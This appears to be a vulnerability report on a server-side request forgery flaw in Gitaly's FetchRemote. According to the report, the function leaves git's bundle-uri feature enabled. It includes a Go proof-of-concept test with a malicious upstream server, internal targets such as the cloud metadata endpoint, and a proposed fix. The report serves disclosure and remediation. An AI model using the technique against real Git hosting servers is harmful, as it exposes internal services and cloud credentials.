### Title
FetchRemote fails to disable `transfer.bundleURI`, enabling attacker-controlled remote to trigger SSRF via bundle-uri capability - (File: internal/gitaly/service/repository/fetch_remote.go)

### Summary
`buildCommandOpts` in `fetch_remote.go` assembles `git-fetch` configuration for `FetchRemote` (used for pull mirrors) but, unlike `cloneFromURLCommand` in `create_repository_from_url.go`, never sets `transfer.bundleURI=false`. This allows any user who controls the URL of a mirror source (attacker-owned upstream) to have the fetched server advertise a `bundle-uri` capability pointing at an arbitrary internal host, which git-fetch will then contact.

### Finding Description
`FetchRemote` → `fetchRemoteAtomic` calls `buildCommandOpts(ctx, &opts, req)` [1](#0-0)  which builds `remote.inmemory.*` git config purely from `req.GetRemoteParams()` fields (URL, refspecs, resolved address, auth header) and appends it via `gitcmd.WithConfigEnv(config...)` [2](#0-1) . Nowhere in this function, nor in `Repo.FetchRemote` in `internal/git/localrepo/remote.go` [3](#0-2) , is `transfer.bundleURI` disabled.

By contrast, `cloneFromURLCommand` (used by `CreateRepositoryFromURL`) explicitly disables this feature with an inline comment acknowledging the exact SSRF risk: "Since the URI can point to any server, including localhost, this is to prevent attack vectors that could abuse this mechanism." [4](#0-3) 

The `bundle-uri` git protocol capability lets the server advertise a `bundle.<id>.uri` value during ref advertisement; when `transfer.bundleURI` is enabled (Git's default), the client (`git-fetch`) will download that URI directly, independent of the URL that was originally requested. Since `FetchRemote`'s remote URL is attacker-controlled (a pull-mirror source that the unprivileged repository owner configures), the attacker's own HTTP/Git server can respond with a bundle-uri capability pointing to any internal address (e.g., `http://169.254.169.254/latest/meta-data`, `http://localhost:9090/internal`), and Gitaly's git-fetch process — running inside the Gitaly host — will issue that outbound request. This bypasses the intended invariant that Git's network destinations are limited to what the RPC caller explicitly authorized.

### Impact Explanation
This is a Server-Side Request Forgery (SSRF) from the Gitaly process to arbitrary internal/cloud-metadata endpoints, triggered purely by an attacker-controlled upstream Git server used in a `FetchRemote`/pull-mirror operation. Depending on network topology this could expose cloud instance metadata (credentials), reach internal-only services, or be used for internal port scanning — matching GitLab's SSRF bounty impact class.

### Likelihood Explanation
Preconditions are minimal: an unprivileged user needs only to configure a pull mirror (or otherwise trigger `FetchRemoteRequest`) pointing at a Git HTTP server they control. No shared secret, admin role, or MITM position is required — the "attacker-controlled Git HTTP server" precondition is directly satisfiable by an unprivileged user setting up their own upstream repository as a mirror source. This makes the issue readily reproducible and repeatable.

### Recommendation
In `buildCommandOpts` (`internal/gitaly/service/repository/fetch_remote.go`), append a config/global option disabling bundle URIs, mirroring the fix already applied in `cloneFromURLCommand`:
```go
opts.CommandOptions = append(opts.CommandOptions, gitcmd.WithGlobalOption(gitcmd.ConfigPair{Key: "transfer.bundleURI", Value: "false"}))
```
Apply the same fix to any other fetch path that accepts attacker/user-controlled remote URLs (e.g. `FetchInternalRemote`/`FetchBundle` paths) to ensure consistent protection.

### Proof of Concept
```go
func TestFetchRemote_BundleURISSRF(t *testing.T) {
    ctx := testhelper.Context(t)

    // Canary listener representing an internal-only target.
    var hit bool
    canary := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        hit = true
    }))
    defer canary.Close()

    // Malicious upstream advertising a bundle-uri capability pointing at the canary.
    server := gittest.HTTPServer(t, ctx, func(w http.ResponseWriter, r *http.Request) {
        if strings.HasSuffix(r.URL.Path, "/info/refs") {
            w.Header().Set("Content-Type", "application/x-git-upload-pack-advertisement")
            fmt.Fprintf(w, "001e# service=git-upload-pack\n0000")
            // capability line advertising bundle-uri
            fmt.Fprintf(w, "0032<sha> HEAD\x00bundle-uri\n0000")
        }
        // handle a request to /?bundle-uri command returning bundle.foo.uri=<canary>
        if strings.HasSuffix(r.URL.Path, "/git-upload-pack") && strings.Contains(r.URL.RawQuery, "bundle-uri") {
            fmt.Fprintf(w, "bundle.foo.uri=%s/bundle\n", canary.URL)
        }
    })

    repoProto, repoPath := gittest.CreateRepository(t, ctx, cfg)
    client, _ := setupRepositoryService(t)

    _, err := client.FetchRemote(ctx, &gitalypb.FetchRemoteRequest{
        Repository: repoProto,
        RemoteParams: &gitalypb.Remote{
            Url: server.URL,
        },
    })
    require.NoError(t, err)

    require.True(t, hit, "expected canary to receive SSRF request via bundle-uri")
}
```
Expected: without the fix, `hit` becomes `true`, showing Gitaly's `git-fetch` contacted the attacker-chosen internal endpoint. After adding `transfer.bundleURI=false` to `buildCommandOpts`, the canary is never contacted.

### Citations

**File:** internal/gitaly/service/repository/fetch_remote.go (L79-81)
```go
	if err := buildCommandOpts(ctx, &opts, req); err != nil {
		return false, false, err
	}
```

**File:** internal/gitaly/service/repository/fetch_remote.go (L260-304)
```go
func buildCommandOpts(ctx context.Context, opts *localrepo.FetchOpts, req *gitalypb.FetchRemoteRequest) error {
	remoteURL := req.GetRemoteParams().GetUrl()
	var config []gitcmd.ConfigPair

	for _, refspec := range getRefspecs(req.GetRemoteParams().GetMirrorRefmaps()) {
		config = append(config, gitcmd.ConfigPair{
			Key: "remote.inmemory.fetch", Value: refspec,
		})
	}

	if resolvedAddress := req.GetRemoteParams().GetResolvedAddress(); resolvedAddress != "" {
		modifiedURL, resolveConfig, err := gitcmd.GetURLAndResolveConfig(remoteURL, resolvedAddress)
		if err != nil {
			return fmt.Errorf("couldn't get curloptResolve config: %w", err)
		}

		remoteURL = modifiedURL
		config = append(config, resolveConfig...)
	}

	config = append(config, gitcmd.ConfigPair{Key: "remote.inmemory.url", Value: remoteURL})

	if featureflag.FetchRemoteProactiveAuth.IsEnabled(ctx) {
		if u, err := url.Parse(remoteURL); err == nil && u.User != nil {
			password, _ := u.User.Password()
			if u.User.Username() != "" && password != "" {
				config = append(config, gitcmd.ConfigPair{
					Key:   "http.proactiveAuth",
					Value: "basic",
				})
			}
		}
	}

	if authHeader := req.GetRemoteParams().GetHttpAuthorizationHeader(); authHeader != "" {
		config = append(config, gitcmd.ConfigPair{
			Key:   fmt.Sprintf("http.%s.extraHeader", req.GetRemoteParams().GetUrl()),
			Value: "Authorization: " + authHeader,
		})
	}

	opts.CommandOptions = append(opts.CommandOptions, gitcmd.WithConfigEnv(config...))

	return nil
}
```

**File:** internal/git/localrepo/remote.go (L94-119)
```go
	commandOptions := []gitcmd.CmdOpt{
		gitcmd.WithEnv(opts.Env...),
		gitcmd.WithStdout(opts.Stdout),
		gitcmd.WithStderr(opts.Stderr),
		gitcmd.WithConfig(gitcmd.ConfigPair{
			// Git is so kind to point out that we asked it to not show forced updates
			// by default, so we need to ask it not to do that.
			Key: "advice.fetchShowForcedUpdates", Value: "false",
		}),
		gitcmd.WithConfig(gitcmd.ConfigPair{
			// The patch series https://lore.kernel.org/git/20240910203835.2288291-1-bence@ferdinandy.com/
			// introduces new behaviour that automatically sets the local HEAD to the remote's HEAD during
			// a fetch. This happens when the mirror refspec is used to fetch into a bare repository, which
			// we use in operations like `FetchBundle`.
			//
			// Setting the remote's `followremotehead` config to "never" will disable the new behaviour. We
			// do this temporarily until we're sure the new behaviour doesn't have any consequences.
			Key: fmt.Sprintf("remote.%s.followremotehead", remoteName), Value: "never",
		}),
	}
	if opts.DisableTransactions {
		commandOptions = append(commandOptions, gitcmd.WithDisabledHooks())
	} else {
		commandOptions = append(commandOptions, gitcmd.WithRefTxHook(objectHash, repo))
	}
	commandOptions = append(commandOptions, opts.CommandOptions...)
```

**File:** internal/gitaly/service/repository/create_repository_from_url.go (L72-75)
```go
	// Drop support for bundle URI when fetching from a remote repository.
	// Since the URI can point to any server, including localhost, this is to
	// prevent attack vectors that could abuse this mechanism.
	opts = append(opts, gitcmd.WithGlobalOption(gitcmd.ConfigPair{Key: "transfer.bundleURI", Value: "false"}))
```
